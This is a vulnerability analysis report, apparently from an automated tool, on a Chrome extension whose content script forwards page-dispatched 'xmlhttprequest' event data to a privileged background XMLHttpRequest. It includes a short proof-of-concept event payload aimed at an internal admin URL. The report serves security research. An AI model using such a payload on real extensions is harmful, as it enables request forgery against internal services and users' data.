# CoCo Analysis: pcopckddelbbjcbobgmcaadmgnghccgd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_xmlhttprequest → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pcopckddelbbjcbobgmcaadmgnghccgd/opgen_generated_files/cs_0.js
Line 808    document.addEventListener('xmlhttprequest', function(evt) {
    evt
Line 836            details: evt.detail.data
    evt.detail.data

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pcopckddelbbjcbobgmcaadmgnghccgd/opgen_generated_files/bg.js
Line 1362        xhr.open(d.method, d.url, !d.synchronous, d.user || '', d.password || '');
    d.url
```

**Code:**
```javascript
// Content script (cs_0.js, lines 808-838) - Entry point
document.addEventListener('xmlhttprequest', function(evt) { // ← Attacker can dispatch this event
    var port = chrome.runtime.connect({
        name: "UserScriptXhr"
    });
    port.onDisconnect.addListener(() => {
        document.dispatchEvent(new CustomEvent('xmlhttprequest_cleanup_' + evt.detail.id));
    });
    port.onMessage.addListener((msg, src) => {
        document.dispatchEvent(new CustomEvent('xmlhttprequest_handle_' + evt.detail.id, {
            detail: msg
        }));
        switch (msg.type) {
            case 'abort':
            case 'error':
            case 'load':
            case 'loadend':
            case 'timeout':
                port.disconnect();
                document.dispatchEvent(new CustomEvent('xmlhttprequest_cleanup_' + evt.detail.id));
                break;
            default:
                break;
        }
    });
    port.postMessage({
        name: "open",
        details: evt.detail.data // ← Attacker-controlled event data passed to background
    });
});

// Background script (bg.js, lines 1362+) - Sink
xhr.open(d.method, d.url, !d.synchronous, d.user || '', d.password || ''); // ← Attacker controls d.url
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**
```javascript
// Malicious webpage can dispatch custom event
document.dispatchEvent(new CustomEvent('xmlhttprequest', {
    detail: {
        id: '123',
        data: {
            method: 'GET',
            url: 'http://internal-server/admin/delete', // ← Attacker-controlled URL
            synchronous: false
        }
    }
}));
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. The attacker can make the extension perform privileged cross-origin requests to arbitrary URLs, potentially accessing internal network resources, making requests to localhost services, or exfiltrating data to attacker-controlled servers. The extension has <all_urls> permission and webRequest permissions, making this particularly dangerous.
